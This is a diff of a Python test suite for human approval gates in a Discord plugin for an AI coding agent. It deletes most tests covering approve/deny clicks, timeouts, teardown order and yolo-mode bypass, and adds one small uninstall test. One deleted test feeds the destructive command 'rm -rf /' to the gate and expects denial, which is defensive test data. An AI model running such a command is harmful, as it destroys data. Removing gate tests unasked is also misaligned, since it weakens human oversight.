-            approvals.approval_backend, session_id, "File Operation", "write", None
-        )
-    )
-    message = await _wait_for_gate(client.channels[CHANNEL_A])
-
-    stranger = await _click(message, approvals.APPROVE_LABEL, "9999")
-    assert stranger.response.ephemeral
-    assert not gate.done()
-
-    await _click(message, approvals.DENY_LABEL, ALICE_DISCORD_ID)
-    assert await gate == (False, None)
-
-
-async def test_ac47_a_second_click_is_idempotent(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
-            approvals.approval_backend, session_id, "File Operation", "write", None
-        )
-    )
-    message = await _wait_for_gate(client.channels[CHANNEL_A])
-
-    await _click(message, approvals.APPROVE_LABEL, ALICE_DISCORD_ID)
-    assert await gate == (True, None)
-    edits_after_first = list(message.edits)
-
-    # Double-click / network retry: must not resolve a second time.
-    second = await _click(message, approvals.DENY_LABEL, ALICE_DISCORD_ID)
-    assert second.response.deferred
-    assert second.response.ephemeral, "the user is told it was already decided"
-    assert message.edits == edits_after_first, "no second outcome is written"
-
-
-async def test_ac47_the_resolved_message_names_who_decided(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
-            approvals.approval_backend, session_id, "File Operation", "write", None
-        )
-    )
-    await _approve(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-    assert await gate == (True, None)
-
-    message = client.channels[CHANNEL_A].sent[0]
-    assert message.edits, "the outcome must be written back to the message"
-    assert ALICE in message.edits[-1]
-    assert all(child.disabled for child in message.view.children)
-
-
-async def test_ac48_the_default_gate_timeout_is_120_seconds():
-    assert approvals.GATE_TIMEOUT_SECONDS == 120
-    assert approvals.GATE_TIMEOUT_SECONDS == authz.GATE_TIMEOUT_SECONDS
-
-
-async def test_ac48_a_timed_out_gate_is_denied_and_marked_expired(client, monkeypatch):
-    """Never let a gate vanish quietly -- the channel must see what happened."""
-    monkeypatch.setattr(approvals, "GATE_TIMEOUT_SECONDS", 0.05)
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    result = await asyncio.to_thread(
-        approvals.approval_backend, session_id, "File Operation", "write", None
-    )
-    assert result == (False, None)
-
-    message = client.channels[CHANNEL_A].sent[0]
-    assert message.edits, "the expiry must be written back"
-    assert "expired" in message.edits[-1].lower()
-    assert "denied" in message.edits[-1].lower()
-    assert all(child.disabled for child in message.view.children)
-
-
-async def test_ac48_a_click_after_expiry_does_not_resolve(client, monkeypatch):
-    monkeypatch.setattr(approvals, "GATE_TIMEOUT_SECONDS", 0.05)
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    assert await asyncio.to_thread(
-        approvals.approval_backend, session_id, "File Operation", "write", None
-    ) == (False, None)
-
-    message = client.channels[CHANNEL_A].sent[0]
-    late = await _click(message, approvals.APPROVE_LABEL, ALICE_DISCORD_ID)
-    assert late.response.ephemeral
-    assert len(message.edits) == 1, "the expiry text stands"
-
-
-# --------------------------------------------------------------------------- #
-# AC-60 — teardown order (INV-7 clause 5) and the sid=None fail-safe
-# --------------------------------------------------------------------------- #
-
-
-def test_ac60_the_backend_declares_sid_with_a_default():
-    import inspect
-
-    parameters = inspect.signature(approvals.approval_backend).parameters
-    assert parameters["sid"].default is None
-
-
-async def test_ac60_wrong_teardown_order_denies_instead_of_raising(client):
-    """L1 rolled back first: the core now calls our 4-arg backend with three.
-
-    Measured (R7-N3): the call is positional, so there is no TypeError -- ``sid``
-    silently receives the TITLE string.  The denial therefore has to come from
-    the unroutable sid, not from a ``sid is None`` branch.
-    """
-    _approver(ALICE_DISCORD_ID, ALICE)
-    _own(CHANNEL_A, ALICE)
-    approvals.install()
-    concurrency.install()
-    concurrency.uninstall()  # deliberately the WRONG order
-
-    from code_puppy.tools.common import get_approval_backend
-
-    backend = get_approval_backend()
-    result = await asyncio.to_thread(backend, "Shell Command", "rm -rf /", None)
-
-    assert result == (False, None)
-    assert client.channels[CHANNEL_A].sent == []
-
-
-def test_ac60_install_order_is_documented_by_uninstall_working_standalone():
-    """L4 must be able to stand down while L1 is still installed."""
-    concurrency.install()
-    try:
-        approvals.install()
-        approvals.uninstall()
-
-        from code_puppy.tools.common import get_approval_backend
-
-        assert get_approval_backend() is None, "INV-7 clause 2: None stays None"
-    finally:
-        concurrency.uninstall()
-
-
-# --------------------------------------------------------------------------- #
-# Wiring — the layer has to be switched on somewhere or it does not exist
-# --------------------------------------------------------------------------- #
-
-
-async def test_the_plugin_boot_tears_down_l4_before_l1(monkeypatch):
-    """INV-7 clause 5: L4 deregisters BEFORE L1 rolls patch C back.
-
-    The other order leaves a 4-arg backend in the slot while the core calls it
-    with three again, routing gates by a title string.  Checked by running the
-    real ``_serve`` and recording the call order.
-    """
-    from code_puppy.plugins.cp_discord import register_callbacks
-
-    order: List[str] = []
-
-    def _record(name: str):
-        return lambda *a, **kw: order.append(name)
-
-    # Boot refuses to serve with no identities configured, so give it one:
-    # this test is about teardown ORDER, not about the identity gate.
-    monkeypatch.setattr(
-        register_callbacks,
-        "_read_identity_lists",
-        lambda: ([f"discord:{ALICE_DISCORD_ID}={ALICE}"], []),
-    )
-    monkeypatch.setattr(concurrency, "install", _record("concurrency.install"))
-    monkeypatch.setattr(concurrency, "uninstall", _record("concurrency.uninstall"))
-    monkeypatch.setattr(concurrency, "selftest", lambda: (True, "ok"))
-    monkeypatch.setattr(approvals, "install", _record("approvals.install"))
-    monkeypatch.setattr(approvals, "uninstall", _record("approvals.uninstall"))
-    # A missing system channel is its own boot refusal (round 9, C3), and this
-    # test is about teardown ORDER -- so configure one and keep the subject.
-    from code_puppy.plugins.cp_discord import output
-
-    monkeypatch.setattr(output, "resolve_system_channel_id", lambda: 7777)
-    monkeypatch.setattr(output, "install", lambda **_: None)
-    monkeypatch.setattr(output, "uninstall", lambda: None)
-
-    async def _fake_gateway(*_: Any, **__: Any) -> int:
-        order.append("serve")
-        return 0
-
-    monkeypatch.setattr(gateway, "run_gateway", _fake_gateway)
-
-    assert await register_callbacks._serve(object(), "token") == 0
-
-    assert order.index("approvals.install") < order.index("serve"), (
-        "the gates must be live before the first message is served"
-    )
-    assert order.index("approvals.uninstall") < order.index("concurrency.uninstall")
-
-
-async def test_the_plugin_boot_refuses_to_serve_without_approval_gates(monkeypatch):
-    """A bot that cannot gate must not run at all -- serving would be the bypass."""
-    from code_puppy.plugins.cp_discord import register_callbacks
-
-    served = False
-
-    async def _fake_gateway(*_: Any, **__: Any) -> int:
-        nonlocal served
-        served = True
-        return 0
-
-    def _refuse() -> None:
-        raise approvals.ApprovalError("another approval backend is installed")
-
-    monkeypatch.setattr(
-        register_callbacks,
-        "_read_identity_lists",
-        lambda: ([f"discord:{ALICE_DISCORD_ID}={ALICE}"], []),
-    )
-    monkeypatch.setattr(concurrency, "install", lambda: None)
-    monkeypatch.setattr(concurrency, "uninstall", lambda: None)
-    monkeypatch.setattr(concurrency, "selftest", lambda: (True, "ok"))
-    monkeypatch.setattr(approvals, "install", _refuse)
-    monkeypatch.setattr(gateway, "run_gateway", _fake_gateway)
-
-    assert await register_callbacks._serve(object(), "token") == 1
-    assert served is False
-
-
-async def test_a_broken_sink_in_the_button_never_leaves_the_gate_hanging(client):
-    """A Discord failure while resolving must still end the gate (INV-3)."""
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
-            approvals.approval_backend, session_id, "File Operation", "write", None
-        )
-    )
-    message = await _wait_for_gate(client.channels[CHANNEL_A])
-
-    async def exploding_edit(*_: Any, **__: Any):
-        raise RuntimeError("discord went away")
-
-    message.edit = exploding_edit
-    await _click(message, approvals.APPROVE_LABEL, ALICE_DISCORD_ID)
-
-    assert await gate == (True, None), "the decision survives a failed edit"
-
-
-async def test_gate_state_does_not_leak_after_a_resolved_gate(client):
-    _approver(ALICE_DISCORD_ID, ALICE)
-    session_id = _own(CHANNEL_A, ALICE)
-    approvals.install()
-
-    gate = asyncio.ensure_future(
-        asyncio.to_thread(
-            approvals.approval_backend, session_id, "File Operation", "write", None
-        )
-    )
-    await _approve(client.channels[CHANNEL_A], ALICE_DISCORD_ID)
-    await gate
-
-    assert approvals.pending_gates() == {}
-    assert authz.get_gate(list(authz._GATES)[0] if authz._GATES else "x") is None
-
-
-def test_the_module_never_consults_yolo_mode():
-    """L3/R4: reading ``get_yolo_mode`` on the shell path would be the bypass."""
-    import inspect
-
-    source = inspect.getsource(approvals)
-    assert "get_yolo_mode" not in source, (
-        "yolo must only be consulted through authz.file_gate_callback_active()"
-    )
+def test_uninstall_restores_the_previous_backend(authz_db):
+    from code_puppy.tools.common import get_approval_backend, set_approval_backend
+
+    approvals.uninstall()
+    assert get_approval_backend() is None
+    set_approval_backend(None)
